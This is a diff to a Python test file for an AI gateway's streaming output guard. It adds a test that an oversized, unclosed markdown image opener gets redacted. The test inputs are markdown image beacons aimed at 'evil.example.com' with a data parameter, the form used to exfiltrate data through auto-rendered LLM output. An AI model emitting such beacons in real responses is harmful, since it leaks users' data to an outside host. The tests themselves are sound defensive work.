@@ -74,12 +74,14 @@ if "litellm" not in sys.modules:
     sys.modules["litellm.exceptions"] = fake_exceptions
 
 try:  # tolerate both import roots used across this suite
-    from secure_streaming import SecureStreamingResponse, STREAM_LOOKAHEAD_BYTES
+    from secure_streaming import (
+        SecureStreamingResponse, STREAM_LOOKAHEAD_BYTES, MAX_OPEN_MEDIA_HOLDBACK,
+    )
     from scanner import InputScanner
     from patterns import detect_pii, redact_all
 except ImportError:  # pragma: no cover
     from ai_mesh_gateway.secure_streaming import (
-        SecureStreamingResponse, STREAM_LOOKAHEAD_BYTES,
+        SecureStreamingResponse, STREAM_LOOKAHEAD_BYTES, MAX_OPEN_MEDIA_HOLDBACK,
     )
     from ai_mesh_gateway.scanner import InputScanner
     from ai_mesh_gateway.patterns import detect_pii, redact_all
@@ -489,6 +491,27 @@ def test_g40_streaming_split_beacon_across_boundary_no_autorender():
     pieces = ["See ![x](https://evil.", f"example.com/log?d={blob}). Done."]
     delivered = _run_real_guard(pieces)
     assert not _G40_AUTORENDER.search(delivered), f"split beacon reassembled: {delivered[:120]!r}"
+
+
+@pytest.mark.parametrize("use_guard", [True, False], ids=["guard", "fallback"])
+def test_g40_cap_failclosed_oversized_unclosed_opener(use_guard):
+    """An unclosed media opener that grows past MAX_OPEN_MEDIA_HOLDBACK must FAIL
+    CLOSED: _defang_open_media replaces the opener with [exfil-redacted] in place, so
+    no auto-render beacon can reassemble even if a ')' arrives after the cap flush.
+    Covers the branch the other G40 tests don't (payload < cap, or closes first)."""
+    frag = "A" * 5000  # base64-charset, no boundary char and no ')' — stays unclosed
+    assert 3 * len(frag) > MAX_OPEN_MEDIA_HOLDBACK, "setup must exceed the holdback cap"
+    pieces = ["![x](https://evil.example.com/l?d=", frag, frag, frag, ") tail."]
+    delivered = _run_real_guard(pieces) if use_guard else _run(pieces, use_guard=False)
+    assert not _G40_AUTORENDER.search(delivered), (
+        f"[cap use_guard={use_guard}] auto-render beacon survived the cap defang: {delivered[:120]!r}"
+    )
+    assert "[exfil-redacted]" in delivered, (
+        f"[cap use_guard={use_guard}] the oversized opener was not defanged in place"
+    )
+    assert not ("![" in delivered and "](http" in delivered and "evil" in delivered), (
+        f"[cap use_guard={use_guard}] renderable beacon parts survived"
+    )
 
 
 if __name__ == "__main__":  # pragma: no cover
